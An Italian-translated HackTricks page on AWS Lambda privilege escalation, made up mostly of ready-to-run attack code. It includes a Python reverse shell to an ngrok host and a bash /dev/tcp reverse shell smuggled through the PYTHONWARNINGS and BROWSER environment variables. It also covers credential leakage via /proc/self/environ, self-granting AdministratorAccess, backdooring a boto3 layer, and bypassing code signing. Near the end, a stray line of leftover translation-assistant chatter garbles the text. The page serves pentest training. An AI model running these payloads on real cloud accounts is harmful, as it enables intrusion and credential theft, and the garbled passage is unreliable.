# AWS - Lambda Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## lambda

Maggiori informazioni su lambda in:

{{#ref}}
../../aws-services/aws-lambda-enum.md
{{#endref}}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Gli utenti con le autorizzazioni **`iam:PassRole`, `lambda:CreateFunction` e `lambda:InvokeFunction`** possono elevare i loro privilegi.\
Possono **creare una nuova Lambda function e assegnarle un IAM role esistente**, concedendo alla funzione i permessi associati a quel role. L'utente può quindi **scrivere e caricare codice in questa Lambda function (ad esempio con una rev shell)**.\
Una volta che la funzione è configurata, l'utente può **avviarne l'esecuzione** e le azioni desiderate invocando la Lambda function tramite l'AWS API. Questo approccio permette efficacemente all'utente di eseguire compiti indirettamente tramite la Lambda function, operando con il livello di accesso concesso dall'IAM role associato.\\

Un attacker potrebbe abusarne per ottenere una **rev shell e rubare il token**:
```python:rev.py
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```

```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Potresti anche **abuse the lambda role permissions** dalla lambda function stessa.\
Se il lambda role avesse sufficienti permissions potresti usarlo per concederti admin rights:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
È anche possibile ottenere un leak delle credenziali del ruolo della lambda senza necessità di una connessione esterna. Questo può essere utile per **Network isolated Lambdas** usate per attività interne. Se ci sono security groups sconosciuti che filtrano i tuoi reverse shells, questo pezzo di codice ti permetterà di ottenere direttamente il leak delle credenziali come output della lambda.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Impatto Potenziale:** Privesc diretto al ruolo di servizio lambda arbitrario specificato.

> [!CAUTION]
> Nota che anche se può sembrare interessante **`lambda:InvokeAsync`** **non** permette da solo di **eseguire `aws lambda invoke-async`**, è necessario anche `lambda:InvokeFunction`

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Come nello scenario precedente, puoi **concederti il permesso `lambda:InvokeFunction`** se hai il permesso **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Impatto potenziale:** Privesc diretto al ruolo di servizio Lambda arbitrario specificato.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Utenti con i permessi **`iam:PassRole`, `lambda:CreateFunction` e `lambda:CreateEventSourceMapping`** (e potenzialmente `dynamodb:PutItem` e `dynamodb:CreateTable`) possono indirettamente **escalate privileges** anche senza `lambda:InvokeFunction`.\  
Possono creare una **funzione Lambda con codice dannoso e assegnarle un ruolo IAM esistente**.

Invece di invocare direttamente la funzione Lambda, l'utente configura o utilizza una tabella DynamoDB esistente, collegandola alla Lambda tramite un event source mapping. Questa configurazione assicura che la funzione Lambda venga **attivata automaticamente all'inserimento di un nuovo item** nella tabella, sia per azione dell'utente sia per un altro processo, innescando quindi indirettamente la funzione Lambda ed eseguendo il codice con i permessi del ruolo IAM passato.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Se DynamoDB è già attivo nell'ambiente AWS, l'utente deve solo **configurare l'event source mapping** per la funzione Lambda. Tuttavia, se DynamoDB non è in uso, l'utente deve **creare una nuova tabella** con lo streaming abilitato:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Ora è possibile **collegare la funzione Lambda alla tabella DynamoDB** creando **un event source mapping**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Con la funzione Lambda collegata allo stream di DynamoDB, l'attaccante può **innescare indirettamente la Lambda attivando lo stream di DynamoDB**. Questo può essere fatto **inserendo un elemento** nella tabella DynamoDB:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potenziale impatto:** Privesc diretto al ruolo di servizio lambda specificato.

### `lambda:AddPermission`

Un attacker con questa autorizzazione può **assegnarsi (o assegnare ad altri) qualsiasi permesso** (questo genera resource based policies per concedere accesso alla risorsa):
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
**Impatto potenziale:** Privesc diretto al ruolo di servizio di lambda, ottenuto concedendo il permesso di modificare il codice e di eseguirlo.

### `lambda:AddLayerVersionPermission`

Un attacker con questo permesso può **concedersi (o concedere ad altri) il permesso `lambda:GetLayerVersion`**. Potrebbe accedere al layer e cercare vulnerabilità o informazioni sensibili.
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Impatto potenziale:** Potenziale accesso a informazioni sensibili.

### `lambda:UpdateFunctionCode`

Utenti che possiedono il permesso **`lambda:UpdateFunctionCode`** possono **modificare il codice di una funzione Lambda esistente collegata a un ruolo IAM.**\
L'attaccante può **modificare il codice della funzione Lambda per esfiltrare le credenziali IAM**.

Anche se l'attaccante potrebbe non avere la capacità diretta di invocare la funzione, se la funzione Lambda è preesistente e operativa, è probabile che venga attivata tramite workflow o eventi esistenti, facilitando così indirettamente l'esecuzione del codice modificato.
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
**Impatto potenziale:** privesc diretto al ruolo di servizio lambda utilizzato.

### `lambda:UpdateFunctionConfiguration`

#### RCE tramite variabili d'ambiente

Con questi permessi è possibile aggiungere variabili d'ambiente che faranno eseguire al Lambda codice arbitrario. Per esempio, in python è possibile abusare delle variabili d'ambiente `PYTHONWARNING` e `BROWSER` per far sì che un processo python esegua comandi arbitrari:
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
Per altri linguaggi di scripting ci sono altre variabili d'ambiente che puoi usare. Per maggiori informazioni, consulta le sottosezioni sui linguaggi di scripting in:

{{#ref}}
https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/index.html
{{#endref}}

#### RCE via Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) consente di includere **code** nella tua funzione Lambda ma **memorizzandolo separatamente**, così il codice della funzione può rimanere piccolo e **più funzioni possono condividere lo stesso codice**.

All'interno della funzione Lambda puoi verificare i percorsi da cui il codice python viene caricato con una funzione come la seguente:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
These are the places:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

For example, the library boto3 is loaded from `/var/runtime/boto3` (4th position).

#### Sfruttamento

È possibile abusare del permesso `lambda:UpdateFunctionConfiguration` per **aggiungere un nuovo layer** a una lambda function. Per eseguire codice arbitrario questo layer deve contenere qualche **library che la lambda importerà.** Se puoi leggere il codice della lambda, puoi trovare questo facilmente; nota anche che potrebbe essere possibile che la lambda sia **già usando un layer** e potresti **scaricare** il layer e **inserire il tuo codice** al suo interno.

Ad esempio, supponiamo che la lambda stia usando la library boto3; questo creerà un layer locale con l'ultima versione della library:
```bash
pip3 install -t ./lambda_layer boto3
```
Puoi aprire `./lambda_layer/boto3/__init__.py` e **inserire la backdoor nel codice globale** (ad esempio una funzione per esfiltrare le credentials o ottenere una reverse shell).

Poi, zip la directory `./lambda_layer` e **carica il nuovo lambda layer** nel tuo account (o in quello della vittima, ma potresti non avere i permessi per questo).\
Nota che devi creare una cartella python e mettere le librerie lì per sovrascrivere /opt/python/boto3. Inoltre, il layer deve essere **compatibile con la versione di python** usata dalla lambda e se lo carichi nel tuo account, deve trovarsi nella **stessa regione:**
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
Ora, rendi il lambda layer caricato **accessibile da qualsiasi account**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
E allega il lambda layer alla funzione lambda vittima:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Il passo successivo sarebbe o **invocare la funzione** da noi se possibile o aspettare che **venga invocata** per vie normali — che è il metodo più sicuro.

Un modo più stealth per sfruttare questa vulnerabilità può essere trovato in:

{{#ref}}
../../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md
{{#endref}}

**Impatto potenziale:** Direct privesc al lambda service role usato.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Forse con questi permessi puoi creare una funzione ed eseguirla chiamando l'URL... non sono riuscito a trovare un modo per testarlo, quindi fammi sapere se ci riesci!

### Lambda MitM

Alcune lambda stanno **ricevendo informazioni sensibili dagli utenti nei parametri.** Se ottieni RCE in una di esse, puoi exfiltrate le informazioni che altri utenti le inviano; controlla in:

{{#ref}}
../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md
{{#endref}}

## Riferimenti

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{{#include ../../../../banners/hacktricks-training.md}}




### `lambda:DeleteFunctionCodeSigningConfig` or `lambda:PutFunctionCodeSigningConfig` + `lambda:UpdateFunctionCode` — Bypass Lambda Code Signing

Se una Lambda function impone il code signing, un attaccante che può rimuovere la Code Signing Config (CSC) o degradarla a Warn può deployare codice non firmato nella function. Questo bypassa le protezioni di integrità senza modificare l'IAM role della function o i trigger.

Permessi (uno dei seguenti):
- Path A: `lambda:DeleteFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`
- Path B: `lambda:CreateCodeSigningConfig`, `lambda:PutFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`

Note:
- Per Path B, non serve un AWS Signer profile se la policy CSC è impostata su `WARN` (unsigned artifacts allowed).

Passaggi (REGION=us-east-1, TARGET_FN=<target-lambda-name>):

Prepara un piccolo payload:
```bash
cat > handler.py <<'PY'
import os, json
def lambda_handler(event, context):
return {"pwn": True, "env": list(os.environ)[:6]}
PY
zip backdoor.zip handler.py
```
Percorso A) Rimuovere CSC e aggiornare il codice:
```bash
aws lambda get-function-code-signing-config --function-name $TARGET_FN --region $REGION && HAS_CSC=1 || HAS_CSC=0
if [ "$HAS_CSC" -eq 1 ]; then
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION
fi
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Percorso B) Riduci il livello a Warn e aggiorna il codice (se la cancellazione non è consentita):
```bash
CSC_ARN=$(aws lambda create-code-signing-config \
--description ht-warn-csc \
--code-signing-policies UntrustedArtifactOnDeployment=WARN \
--query CodeSigningConfig.CodeSigningConfigArn --output text --region $REGION)
aws lambda put-function-code-signing-config --function-name $TARGET_FN --code-signing-config-arn $CSC_ARN --region $REGION
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Pronto. Per favore incolla il contenuto di src/pentesting-cloud/aws-security/aws-privilege-escalation/aws-lambda-privesc/README.md che vuoi che traduca. Tradurrò il testo rilevante in italiano rispettando le regole: non tradurrò codice, nomi tecnici, parole comuni di hacking, nomi di cloud/SaaS, link, tag o path.
```bash
aws lambda invoke --function-name $TARGET_FN /tmp/out.json --region $REGION >/dev/null
cat /tmp/out.json
```
Impatto potenziale: possibilità di caricare ed eseguire codice arbitrario non firmato in una funzione che avrebbe dovuto imporre deployment firmati, potenzialmente portando all'esecuzione di codice con le autorizzazioni del ruolo della funzione.

Pulizia:
```bash
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION || true
```

